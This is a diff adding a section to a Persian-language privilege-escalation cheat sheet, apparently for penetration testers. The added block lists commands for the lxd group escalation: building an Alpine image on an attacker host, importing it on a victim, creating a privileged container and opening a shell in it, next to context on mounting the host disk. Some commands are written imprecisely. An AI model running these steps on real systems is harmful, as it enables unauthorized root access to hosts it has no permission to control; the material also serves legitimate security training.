@@ -309,6 +309,19 @@ mkdir /mnt/fsroot
 mount /dev/sda /mnt/fsroot
 ```
 
+### افزایش دسترسی با lxd
+
+```text
+in attacker host
+1. git clone https://github.com/saghul/lxd-alpine-builder.git
+2. ./build-alpine
+in victim host
+3. download builded image 
+4. import ./alpine-v3.12-x86_64-20200621_2005.tar.gz --alias attacker
+5. lxc init attacker tester -c security.privileged=true
+6. lxc exec tester/bin/sh
+```
+
 ### افزایش دسترسی در journalctl 
 
 اجرا کننده journalctl باید با دسترسی بیشتری مانند sudo اجرا شده باشد.
